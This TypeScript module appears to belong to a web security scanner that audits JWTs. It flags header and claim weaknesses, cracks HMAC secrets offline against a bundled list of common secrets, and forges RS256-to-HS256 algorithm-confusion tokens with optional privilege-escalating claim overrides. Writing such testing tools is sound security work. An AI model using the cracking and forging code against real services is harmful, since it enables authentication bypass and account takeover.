import { createHmac, createPublicKey, timingSafeEqual } from 'node:crypto'

// JWT analysis + offline HMAC-secret crack. Entirely LOCAL — zero network — so it
// is passive, silent, and self-verifying: a cracked secret is proof (it forges a
// valid signature), not a guess. Tokens come from what the tool already holds
// (owaspConfig.authHeader, JS-mined secrets, captured requests), so this squeezes
// signal out of data already on hand.

export type JwtSeverity = 'info' | 'low' | 'medium' | 'high' | 'critical'

export interface JwtFinding {
  name: string
  severity: JwtSeverity
  evidence: string
  source: string
}

// A small, curated set of secrets that show up constantly in tutorials, framework
// defaults, and copy-pasted examples. Bundled in-repo (auditable, offline) rather
// than fetched. The operator can extend it via owaspConfig.jwtSecrets.
export const BUILTIN_JWT_SECRETS: readonly string[] = [
  'secret', 'secretkey', 'secret_key', 'password', 'changeme', 'change-me', 'admin', 'test',
  'jwt', 'jwtsecret', 'jwt_secret', 'token', 'mysecret', 'supersecret', 'super-secret',
  '123456', '12345678', 'qwerty', 'root', 'default', 'example', 'private', 'key', 'signature',
  'your-256-bit-secret', 'your_jwt_secret', 'yoursecret', 'secretpassword', 'p@ssw0rd',
  'my-secret-key', 'mysecretkey', 'HS256', 'jwtkey', 'apikey', 'api_key', 'sekret',
  'devsecret', 'dev', 'staging', 'production', 'prod', 's3cr3t', 'secret123', 'letmein',
]

// Extract JWT-shaped strings from an arbitrary blob (header.payload.signature,
// each base64url). Matches the tighter three-segment form so random dotted tokens
// don't slip in; the analyze step still validates it decodes.
const JWT_RE = /\beyJ[A-Za-z0-9_-]{5,}\.[A-Za-z0-9_-]{5,}\.[A-Za-z0-9_-]{0,}/g

export function findJwts(text: string): string[] {
  if (!text) return []
  return [...new Set(text.match(JWT_RE) ?? [])]
}

function b64urlToBuf(seg: string): Buffer {
  const pad = seg.length % 4 === 0 ? '' : '='.repeat(4 - (seg.length % 4))
  return Buffer.from(seg.replace(/-/g, '+').replace(/_/g, '/') + pad, 'base64')
}

function b64urlEncode(input: Buffer | string): string {
  return Buffer.from(input).toString('base64').replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_')
}

interface DecodedJwt {
  header: Record<string, any>
  payload: Record<string, any>
  signingInput: string
  signature: string
}

export function decodeJwt(token: string): DecodedJwt | null {
  const parts = token.split('.')
  if (parts.length !== 3) return null
  try {
    const header = JSON.parse(b64urlToBuf(parts[0]).toString('utf8'))
    const payload = JSON.parse(b64urlToBuf(parts[1]).toString('utf8'))
    if (typeof header !== 'object' || header == null) return null
    return { header, payload: typeof payload === 'object' && payload ? payload : {}, signingInput: `${parts[0]}.${parts[1]}`, signature: parts[2] }
  } catch {
    return null
  }
}

const HMAC_ALG: Record<string, string> = { HS256: 'sha256', HS384: 'sha384', HS512: 'sha512' }

// Try each candidate secret against an HMAC-signed token. Returns the secret on a
// match (the token's own signature is the oracle — recompute and compare), else
// null. Constant-time compare avoids leaking timing, though it's moot offline.
export function crackHmacSecret(token: string, secrets: Iterable<string>): string | null {
  const decoded = decodeJwt(token)
  if (!decoded) return null
  const alg = String(decoded.header.alg ?? '').toUpperCase()
  const nodeAlg = HMAC_ALG[alg]
  if (!nodeAlg) return null // only HMAC tokens are crackable this way
  const want = b64urlToBuf(decoded.signature)
  if (want.length === 0) return null
  for (const secret of secrets) {
    const got = createHmac(nodeAlg, secret).update(decoded.signingInput).digest()
    if (got.length === want.length && timingSafeEqual(got, want)) return secret
  }
  return null
}

// JWS algorithms whose signature is verified with a PUBLIC key. These are the
// candidates for algorithm-confusion (RS256->HS256): a server that trusts the
// token's own `alg` header and verifies an HS256 token using its RSA *public*
// key can be forged against, because the public key is, by definition, public.
const ASYMMETRIC_ALGS: ReadonlySet<string> = new Set([
  'RS256', 'RS384', 'RS512', 'ES256', 'ES384', 'ES512', 'PS256', 'PS384', 'PS512', 'EDDSA',
])

export function algIsAsymmetric(alg: string | undefined): boolean {
  return ASYMMETRIC_ALGS.has(String(alg ?? '').toUpperCase())
}

// Forge an HS256-signed token from an asymmetric-alg token, HMAC-signing with
// `hmacKey` (the server's PUBLIC key material) as the secret — the RS256->HS256
// confusion. Optionally merge claim overrides (e.g. escalate role/is_admin) into
// the payload. The header alg is rewritten to HS256; everything else is carried
// over. Returns the compact JWT, or null if the source token can't be decoded.
// PURE: builds a string, sends nothing. The gated confirm decides whether to try it.
export function forgeAlgConfusion(
  token: string,
  hmacKey: string | Buffer,
  claimOverrides: Record<string, unknown> = {},
): string | null {
  const decoded = decodeJwt(token)
  if (!decoded) return null
  const header = { ...decoded.header, alg: 'HS256' }
  const payload = { ...decoded.payload, ...claimOverrides }
  const signingInput = `${b64urlEncode(JSON.stringify(header))}.${b64urlEncode(JSON.stringify(payload))}`
  const sig = b64urlEncode(createHmac('sha256', hmacKey).update(signingInput).digest())
  return `${signingInput}.${sig}`
}

// Verify an HS256 token against a candidate secret (the local oracle: recompute
// and constant-time compare). Used to sanity-check a forged token before it is
// sent, and by tests. Returns false for non-HS256 / undecodable tokens.
export function verifyHs256(token: string, secret: string | Buffer): boolean {
  const decoded = decodeJwt(token)
  if (!decoded) return false
  if (String(decoded.header.alg ?? '').toUpperCase() !== 'HS256') return false
  const want = b64urlToBuf(decoded.signature)
  if (want.length === 0) return false
  const got = createHmac('sha256', secret).update(decoded.signingInput).digest()
  return got.length === want.length && timingSafeEqual(got, want)
}

// Convert an RSA public JWK ({kty:'RSA', n, e}) to SPKI PEM so it can be used as
// the HMAC secret for the confusion forge. Returns null for non-RSA or malformed
// JWKs. (EC keys can also be confused, but PEM handling differs; RSA is the common
// jwks case and the one worth acting on here.)
export function jwkToPem(jwk: Record<string, unknown> | null | undefined): string | null {
  if (!jwk || String(jwk.kty).toUpperCase() !== 'RSA' || typeof jwk.n !== 'string' || typeof jwk.e !== 'string') {
    return null
  }
  try {
    const key = createPublicKey({ key: { kty: 'RSA', n: jwk.n, e: jwk.e }, format: 'jwk' })
    return key.export({ type: 'spki', format: 'pem' }).toString()
  } catch {
    return null
  }
}

// A public key can be presented to a JWT library as several byte-strings (the PEM
// verbatim, with/without a trailing newline, or the raw base64 body). A server
// doing HS256(pubkey) uses whichever it happens to hold, so the confirm tries all
// of them. Deduped, non-empty, order preserved.
export function keyMaterialCandidates(pem: string): string[] {
  const trimmed = pem.trim()
  const body = trimmed.replace(/-----BEGIN [^-]+-----|-----END [^-]+-----/g, '').replace(/\s+/g, '')
  const out: string[] = []
  for (const c of [pem, trimmed, `${trimmed}\n`, body]) {
    if (c && !out.includes(c)) out.push(c)
  }
  return out
}

// The response differential that CONFIRMS RS256->HS256 confusion. Three requests:
//   baseline — the original (validly-signed) token: must be ACCEPTED.
//   control  — an HS256 token signed with a WRONG secret: must be REJECTED.
//   forged   — an HS256 token signed with the server's PUBLIC key.
// Confirmed iff the forged token is accepted like the baseline WHILE the control
// is rejected. The control is the false-positive killer: if a wrong-key token is
// also accepted, the endpoint isn't verifying the signature (or isn't auth-gated),
// so acceptance can't be attributed to alg-confusion. Body length within 10%
// absorbs per-request jitter (csrf tokens, timestamps).
export interface ConfusionResponse {
  status: number
  body: string
}

function bodySimilar(a: string, b: string): boolean {
  const m = Math.max(a.length, b.length, 1)
  return Math.abs(a.length - b.length) / m <= 0.1
}

// A response "looks like" the baseline when the status matches and the body is a
// similar size — i.e. the same authorized page, not an auth-error page.
function looksLikeBaseline(r: ConfusionResponse, baseline: ConfusionResponse): boolean {
  return r.status === baseline.status && bodySimilar(r.body, baseline.body)
}

export function confusionConfirmed(
  baseline: ConfusionResponse,
  control: ConfusionResponse,
  forged: ConfusionResponse,
): boolean {
  if (baseline.status >= 400) return false // baseline must be an authorized response
  if (looksLikeBaseline(control, baseline)) return false // server accepts a wrong-key token → not conclusive
  return looksLikeBaseline(forged, baseline) // forged accepted exactly like the valid token
}

// Path-jail for an offline JWT-secret wordlist: an absolute path under the
// wordlists dir, no traversal — the same discipline the ffuf / intruder wordlist
// readers use, so this can't be turned into an arbitrary file read. Pure predicate
// (no fs) so it is unit-testable; the caller does the actual read.
export const JWT_WORDLIST_DIR = '/usr/share/wordlists/'
export function jwtWordlistPathOk(path: string): boolean {
  return /^\/[A-Za-z0-9._/-]+$/.test(path) && !path.includes('..') && path.startsWith(JWT_WORDLIST_DIR)
}

// Analyze one token: structural/claim weaknesses + an HMAC crack attempt. Returns
// [] for anything that isn't a decodable JWT. `now` is injectable for tests.
export function analyzeJwtToken(
  token: string,
  source: string,
  extraSecrets: readonly string[] = [],
  now: number = Date.now(),
): JwtFinding[] {
  const decoded = decodeJwt(token)
  if (!decoded) return []
  const out: JwtFinding[] = []
  const alg = String(decoded.header.alg ?? '').toUpperCase()
  const claims = decoded.payload

  if (alg === 'NONE' || alg === '') {
    out.push({ name: 'JWT accepts alg:none (unsigned)', severity: 'critical', evidence: `header alg=${decoded.header.alg ?? '(empty)'} — the signature is not verified; tokens can be forged`, source })
  }
  if (decoded.header.jku || decoded.header.x5u) {
    out.push({ name: 'JWT header references an external key URL (jku/x5u)', severity: 'high', evidence: `jku/x5u=${decoded.header.jku ?? decoded.header.x5u} — key-injection / SSRF if the URL is attacker-influenced`, source })
  }
  if (typeof decoded.header.kid === 'string' && /[\/'";`|]|\.\./.test(decoded.header.kid)) {
    out.push({ name: 'JWT kid may be injectable', severity: 'medium', evidence: `kid=${decoded.header.kid} contains path/quote characters — test for path-traversal / SQLi in key lookup`, source })
  }
  // Asymmetric signature → candidate for RS256->HS256 confusion. Passive (no
  // proof yet): flagged so the operator can run the gated confirm once the public
  // key (jwks / TLS cert) is known. A server pinning the alg is not affected.
  if (algIsAsymmetric(alg)) {
    out.push({ name: 'JWT uses an asymmetric algorithm (RS256->HS256 confusion candidate)', severity: 'medium', evidence: `header alg=${alg} — if the server verifies HS256 using its PUBLIC key (no alg pinning), a forged HS256(publicKey) token is accepted. Confirm with the JWT confusion check once the public key is known.`, source })
  }
  // crit header: the server MUST reject tokens whose crit params it doesn't
  // process; a listed-but-unhandled param (classically b64, RFC 7797) is a bypass.
  if (decoded.header.crit !== undefined) {
    out.push({ name: 'JWT declares a crit (critical) header', severity: 'low', evidence: `crit=${JSON.stringify(decoded.header.crit)} — the server must reject tokens whose crit params it does not understand; test crit-parameter confusion / header bypass`, source })
  }
  // Unusual typ → cross-service token confusion (a token minted for one audience
  // accepted where a different typ is expected). JWT / at+jwt are the norm.
  const typ = decoded.header.typ
  if (typeof typ === 'string' && typ && !['JWT', 'AT+JWT', 'JOSE', 'JWS', 'JOSE+JSON'].includes(typ.toUpperCase())) {
    out.push({ name: 'JWT has an unusual typ header', severity: 'info', evidence: `typ=${typ} — non-standard token type; if accepted where another typ is expected it enables cross-service token confusion`, source })
  }
  if (claims.exp == null) {
    out.push({ name: 'JWT has no expiry (exp)', severity: 'low', evidence: 'token never expires — a leaked token is valid forever', source })
  } else if (typeof claims.exp === 'number') {
    const iat = typeof claims.iat === 'number' ? claims.iat : now / 1000
    if (claims.exp - iat > 365 * 24 * 3600) {
      out.push({ name: 'JWT lifetime exceeds one year', severity: 'low', evidence: `exp is ${Math.round((claims.exp - iat) / 86400)} days after iat — excessive token lifetime`, source })
    }
  }

  // The headline: crack the HMAC secret offline. A hit is self-verifying proof.
  if (HMAC_ALG[alg]) {
    const secret = crackHmacSecret(token, [...BUILTIN_JWT_SECRETS, ...extraSecrets])
    if (secret) {
      out.push({ name: 'JWT HMAC secret cracked', severity: 'critical', evidence: `${alg} signing secret is "${secret}" — tokens (and any claims, e.g. role/admin) can be forged at will`, source })
    }
  }

  return out
}
